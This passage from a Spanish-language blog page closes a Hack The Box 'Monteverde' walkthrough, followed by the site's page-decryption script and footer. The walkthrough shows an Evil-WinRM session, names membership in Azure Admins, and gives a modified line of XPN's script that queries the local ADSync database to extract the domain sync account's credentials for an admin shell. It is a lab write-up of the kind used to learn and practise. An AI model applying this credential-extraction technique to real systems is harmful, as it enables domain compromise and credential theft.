PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\mhope\Documents&gt;
</code></pre>

<p>Vemos que mhope pertenece al grupo de <code>Azure Admins</code>, despues de investigar acerca de este grupo encontramos un post de XPN que explica como se puede obtener la contraseña y usario desde la base de datos del catalogo de ADSync de azure.</p>

<p><a href="https://blog.xpnsec.com/azuread-connect-for-redteam/"><strong>AzureAd - RedTeam</strong></a></p>

<p>Utilizamos el script <a href="https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1"><strong>azuread_decrypt_msol</strong></a> que viene adjunto al post, modificandolo para que pueda hacer el query a la base de datos local.</p>

<pre><code class="language-powershell">$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Data Source = localhost; Initial Catalog=ADSync; Trusted_Connection=True&quot;
</code></pre>

<p><img src="../../image/htb/monteverde/Screenshot_20200122_225928.png" alt="image" /></p>

<p>Utilizamos las credenciales en evil-winrm obtuvimos una shell y nuestra flag <strong>root.txt</strong>.
<img src="../../image/htb/monteverde/Screenshot_20200122_230055.png" alt="image" /></p>

	</cipher-text>
	<style type="text/css">
		div#hugo-encrypt-sha1sum {display: none;}
		button, .button{  
			align-items: center;
			justify-content: center;
			padding: 8px 18px;
			margin-bottom: 5px;
			background: var(--dark-background-secondary);
			color: inherit;
			text-decoration: none;
			text-align: center;
			font-weight: 500;
			border-radius: 8px;
			border: 1px solid transparent;
			appearance: none;
			cursor: pointer;
			outline: none;
		  }
	</style>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/sha1.js"></script>
	<script>
		
		let cipher = document.getElementsByTagName("cipher-text")[0];
		const storageKey = location.pathname + "password";
		const userStorage =  window['sessionStorage'] ;
		

		function str2buf(str) {
			return new TextEncoder("utf-8").encode(str);
		}
		

		function buf2str(buffer) {
			return new TextDecoder("utf-8").decode(buffer);
		}
		

		function hex2buf(hexStr) {
			return new Uint8Array(hexStr.match(/.{2}/g).map(h => parseInt(h, 16)));
		}
		

		function deriveKey(passphrase, salt) {
			salt = salt || crypto.getRandomValues(new Uint8Array(8));
			return crypto.subtle
				.importKey("raw", str2buf(passphrase), "PBKDF2", false, ["deriveKey"])
				.then(key =>
					crypto.subtle.deriveKey(
						{ name: "PBKDF2", salt, iterations: 1000, hash: "SHA-256" },
						key,
						{ name: "AES-GCM", length: 256 },
						false,
						["encrypt", "decrypt"],
					),
				)
				.then(key => [key, salt]);
		}
		

		function decrypt(passphrase, saltIvCipherHex) {
			const [salt, iv, data] = saltIvCipherHex.split("-").map(hex2buf);
			return deriveKey(passphrase, salt)
				.then(([key]) => crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data))
				.then(v => buf2str(new Uint8Array(v)));
		}
		

		const hugoDecrypt = function(password, type) {
				decrypt(password, cipher.innerText).then(function(decrypted_text) {
					

					let hash = CryptoJS.SHA1(decrypted_text.replace(/\r?\n?[^\r\n]*$/, ""));
					let sha1_sum = CryptoJS.enc.Hex.stringify(hash);

					if ( decrypted_text.includes(sha1_sum) ) {
						document.getElementById("hugo-encrypt-encryption-notice").remove();
						cipher.outerHTML = decrypted_text;
						userStorage.setItem(storageKey, password);
						document.getElementById("hugo-encrypt-sha1sum").innerHTML = "Success: " + sha1_sum;
						$('pre').addClass('code-toolbar language-bash');
						$('code').addClass('language-bash');
                        console.log("Decryption successful. Storing password in sessionStorage.");
					}
					}).catch(function(error) {
                    if (type === "input") {
                        document.getElementById("hugo-encrypt-input-response").innerHTML = "";
                        console.log('', error);
                    } else if (type === "storage") {
                        userStorage.removeItem(location.pathname + "password");
                        console.log("Password changed. Clearing userStorage.", error);
                    }
                });
			};
	</script>
	<script>
		window.onload = () => {
			if (userStorage.getItem(storageKey)) {
				console.log("Found storageKey in userStorage. Attemtping decryption");
				hugoDecrypt(userStorage.getItem(storageKey), "storage");
			}
		};
	</script>
</hugo-encrypt>

</li>
</ul>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/agent_sudo/">
                <span class="button__icon">←</span>
                <span class="button__text">TryHackMe - Agent Sudo</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/bitlab/">
                <span class="button__text">Hack The Box - Bitlab</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
